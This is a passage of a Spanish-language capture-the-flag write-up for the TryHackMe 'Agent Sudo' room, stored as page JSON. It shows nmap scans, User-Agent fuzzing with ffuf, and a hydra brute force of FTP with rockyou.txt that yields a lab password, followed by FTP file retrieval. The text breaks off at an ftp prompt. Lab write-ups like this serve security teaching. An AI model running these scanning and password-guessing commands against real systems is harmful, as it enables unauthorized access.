{"_path":"/writeups/tryhackme-agent-sudo","_dir":"writeups","_draft":false,"_partial":false,"_locale":"","title":"TryHackMe | Agent Sudo","description":"","published":"2025/05/30","slug":"tryhackme-agent-sudo","body":{"type":"root","children":[{"type":"element","tag":"img","props":{"src":"/writeups/tryhackme-agent-sudo/thumbnail.png","width":"200px","heigh":"200px/"},"children":[]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"a","props":{"href":"https://tryhackme.com/room/agentsudoctf","rel":["nofollow"]},"children":[{"type":"text","value":"https://tryhackme.com/room/agentsudoctf"}]}]},{"type":"element","tag":"h2","props":{"id":"escaneo"},"children":[{"type":"text","value":"Escaneo"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Escaneamos todos los puertos TCP de la maquina objetivo con Nmap."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"sudo nmap -n -Pn -T4 10.10.195.209 -oN nmap.txt\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"sudo"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" nmap"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -n"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -Pn"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -T4"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" 10.10.195.209"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -oN"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" nmap.txt\n"}]}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"sudo nmap -n -Pn -T4 10.10.195.209 -oN nmap.txt\n\n# Nmap 7.95 scan initiated Fri May 30 16:11:54 2025 as: /usr/lib/nmap/nmap -p- -n -Pn -T4 -oN nmap.txt 10.10.195.209\nNmap scan report for 10.10.195.209\nHost is up (0.27s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"sudo nmap -n -Pn -T4 10.10.195.209 -oN nmap.txt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"# Nmap 7.95 scan initiated Fri May 30 16:11:54 2025 as: /usr/lib/nmap/nmap -p- -n -Pn -T4 -oN nmap.txt 10.10.195.209\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Nmap scan report for 10.10.195.209\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Host is up (0.27s latency).\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Not shown: 65532 closed tcp ports (reset)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"PORT   STATE SERVICE\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"21/tcp open  ftp\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":9},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"22/tcp open  ssh\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":10},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"80/tcp open  http\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Obtenemos informaci√≥n de los puertos abiertos."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"sudo nmap -sCV -n -Pn -T4 10.10.195.209 -oN nmap-ports.txt\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"sudo"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" nmap"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -sCV"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -n"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -Pn"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -T4"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" 10.10.195.209"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -oN"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" nmap-ports.txt\n"}]}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"sudo nmap -sCV -n -Pn -T4 10.10.195.209 -oN nmap-ports.txt\n\n# Nmap 7.95 scan initiated Fri May 30 16:25:00 2025 as: /usr/lib/nmap/nmap -sCV -p 21,22,80 -n -Pn -T4 -oN nmap-ports.txt 10.10.195.209\nNmap scan report for 10.10.195.209\nHost is up (0.27s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)\n|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)\n|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-title: Annoucement\n|_http-server-header: Apache/2.4.29 (Ubuntu)\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"sudo nmap -sCV -n -Pn -T4 10.10.195.209 -oN nmap-ports.txt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"# Nmap 7.95 scan initiated Fri May 30 16:25:00 2025 as: /usr/lib/nmap/nmap -sCV -p 21,22,80 -n -Pn -T4 -oN nmap-ports.txt 10.10.195.209\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Nmap scan report for 10.10.195.209\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Host is up (0.27s latency).\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"PORT   STATE SERVICE VERSION\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"21/tcp open  ftp     vsftpd 3.0.3\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":9},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":10},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"| ssh-hostkey:\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":11},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":12},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":13},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":14},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":15},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"|_http-title: Annoucement\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":16},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"|_http-server-header: Apache/2.4.29 (Ubuntu)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":17},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n"}]}]}]}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Para agilizar el proceso de escaneo y enumeraci√≥n, primero encontramos puertos abiertos y luego los escaneamos en busca de banners, versiones y otra informaci√≥n util."}]}]},{"type":"element","tag":"h2","props":{"id":"enumeraci√≥n-de-servicios"},"children":[{"type":"text","value":"Enumeraci√≥n de servicios"}]},{"type":"element","tag":"h3","props":{"id":"tcp21"},"children":[{"type":"text","value":"TCP/21"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"No es posible realizar un inicio de sesi√≥n an√≥nimo en el servicio FTP. Por lo que tendremos que revisitar este puerto mas adelante."}]},{"type":"element","tag":"h3","props":{"id":"tcp80"},"children":[{"type":"text","value":"TCP/80"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Se nos da la bienvenida con un mensaje cr√≠ptico."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"img","props":{"alt":"image-1","src":"/writeups/tryhackme-agent-sudo/image-1.png"},"children":[]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"\"user-agent\" se refiere a la cabecera HTTP \"User-Agent\", por lo que debemos de cambiarla para poder acceder. ¬øPero que \"c√≥digo nombre\" debemos utilizar? Puesto que el mensaje fue firmado por Agent R, podemos intuir que nuestro c√≥digo nombre corresponde a alguna de las letras del abecedario."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Creamos una lista de palabras con todas las letras del abecedario en may√∫scula haciendo uso de "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"TTPassGen"}]},{"type":"text","value":"."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"ttpassgen -r \"[?u]{1:1}\" wordlist.txt\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"ttpassgen"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -r"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" \"[?u]{1:1}\""}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" wordlist.txt\n"}]}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"A\nB\nC\n<SNIP>\nY\nZ\n","filename":"wordlist.txt","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"A\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"B\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"C\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"<SNIP>\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Y\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Z\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Enviamos solicitudes con "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"ffuf"}]},{"type":"text","value":". Puesto que la lista de palabras es corta, y no sabemos exactamente que esperar de una respuesta adecuada, podemos optar por no filtrar las respuestas y examinarlas manualmente. Sin embargo, tambi√©n podemos suponer que una respuesta adecuada contendr√° un c√≥digo de respuesta diferente a 200 o tendr√° un tama√±o diferente al usual (218 bytes)."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Para prop√≥sitos educativos, elegiremos seguir las redirecciones y filtrar las respuestas basadas en su tama√±o."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"ffuf -u http://10.10.195.209 -H \"User-Agent: FUZZ\" -w wordlist.txt -c -r -fs 218\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"ffuf"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -u"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" http://10.10.195.209"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -H"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" \"User-Agent: FUZZ\""}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -w"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" wordlist.txt"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -c"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -r"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -fs"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" 218\n"}]}]}]}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"¬øFiltrar por c√≥digo de respuesta o por tama√±o? Filtrar por c√≥digo de respuesta nos puede llevar a omitir respuestas no est√°ndares, por lo que seguiremos la redirecciones y filtraremos por tama√±o de respuesta."}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"ffuf -u http://10.10.195.209 -H \"User-Agent: FUZZ\" -w wordlist.txt -c -r -fs 218\n\n<SNIP>\nR                       [Status: 200, Size: 310, Words: 31, Lines: 19, Duration: 267ms]\nC                       [Status: 200, Size: 177, Words: 27, Lines: 8, Duration: 267ms]\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"ffuf -u http://10.10.195.209 -H \"User-Agent: FUZZ\" -w wordlist.txt -c -r -fs 218\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"<SNIP>\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"R                       [Status: 200, Size: 310, Words: 31, Lines: 19, Duration: 267ms]\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"C                       [Status: 200, Size: 177, Words: 27, Lines: 8, Duration: 267ms]\n"}]}]}]}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"La letra C originalmente nos redirige a otra pagina, mientras que la letra R nos muestra otro mensaje. Si hubi√©ramos filtrado todas las respuestas con c√≥digo 200, hubi√©ramos omitido esta ultima respuesta."}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Al enviar una petici√≥n con el User-Agent \"R\", obtenemos una respuesta ligeramente diferente a la original (pero sin importancia). La letra \"C\" nos revela una respuesta completamente diferente."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"curl -sL -H \"User-Agent: C\" http://10.10.195.209/\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"curl"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -sL"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -H"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" \"User-Agent: C\""}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" http://10.10.195.209/\n"}]}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"curl -sL -H \"User-Agent: C\" http://10.10.195.209/\n\nAttention chris, <br><br>\n\nDo you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>\n\nFrom,<br>\nAgent R\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"curl -sL -H \"User-Agent: C\" http://10.10.195.209/\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Attention chris, <br><br>\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"From,<br>\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Agent R\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descubrimos el nombre de usuario \"chris\" y que su contrase√±a es d√©bil."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Si intentamos enumerar directorios y paginas web, tales como formularios de inicio de sesi√≥n, no obtendremos resultados."}]},{"type":"element","tag":"h2","props":{"id":"explotaci√≥n"},"children":[{"type":"text","value":"Explotaci√≥n"}]},{"type":"element","tag":"h3","props":{"id":"ssh"},"children":[{"type":"text","value":"SSH"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Al no encontrar un vector de explotaci√≥n evidente, usaremos "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"hydra"}]},{"type":"text","value":" para obtener la contrase√±a del servicio SSH mediante fuerza bruta."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Iniciar sesi√≥n en este servicio corresponde al camino hacia el √©xito mas directo, por tanto tiene sentido probar un ataque de fuerza bruta primero con este servicio. Pero en un entorno real este servicio estar√° fuertemente protegido y monitorizado, por lo que deber√≠amos de probar en otros lugares primero."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Finalmente, este ataque falla en obtener una contrase√±a valida en un intervalo de tiempo aceptable."}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Nunca debes realizar un ataque de fuerza bruta, a menos que sea el √∫nico camino disponible o hayan grandes indicios de que este es el camino correcto."}]}]},{"type":"element","tag":"h3","props":{"id":"ftp"},"children":[{"type":"text","value":"FTP"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Al fallar el anterior ataque, esta vez lo intentaremos en el servicio FTP."}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Si hay indicios de que una contrase√±a es d√©bil, vale la pena usar listas de palabras conocidas como rockyou.txt (Solo en CTFs)."}]}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"hydra -l \"chris\" -P /usr/share/wordlists/rockyou.txt -f -vV 10.10.195.209 ftp\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"hydra"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -l"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" \"chris\""}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -P"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" /usr/share/wordlists/rockyou.txt"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -f"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -vV"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" 10.10.195.209"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" ftp\n"}]}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"hydra -l \"chris\" -P /usr/share/wordlists/rockyou.txt -f -vV 10.10.195.209 ftp\n\n<SNIP>\n[ATTEMPT] target 10.10.195.209 - login \"chris\" - pass \"freedom\" - 256 of 14344399 [child 9] (0/0)\n[21][ftp] host: 10.10.195.209   login: chris   password: crystal\n[STATUS] attack finished for 10.10.195.209 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-30 20:05:43\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"hydra -l \"chris\" -P /usr/share/wordlists/rockyou.txt -f -vV 10.10.195.209 ftp\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"<SNIP>\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[ATTEMPT] target 10.10.195.209 - login \"chris\" - pass \"freedom\" - 256 of 14344399 [child 9] (0/0)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[21][ftp] host: 10.10.195.209   login: chris   password: crystal\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[STATUS] attack finished for 10.10.195.209 (valid pair found)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"1 of 1 target successfully completed, 1 valid password found\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-30 20:05:43\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Ingresamos al servidor FTP con las anteriores credenciales y listamos los archivos."}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"ftp> ls\n229 Entering Extended Passive Mode (|||6987|)\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt\n-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg\n-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png\n226 Directory send OK.\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"ftp> ls\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"229 Entering Extended Passive Mode (|||6987|)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"150 Here comes the directory listing.\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"226 Directory send OK.\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descargamos los archivos de forma recursiva."}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"ftp> prompt\nInteractive mode off.\nftp> mget .\nlocal: To_agentJ.txt remote: To_agentJ.txt\n<SNIP>\nlocal: cute-alien.jpg remote: cute-alien.jpg\n<SNIP>\nlocal: cutie.png remote: cutie.png\n<SNIP>\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"ftp> 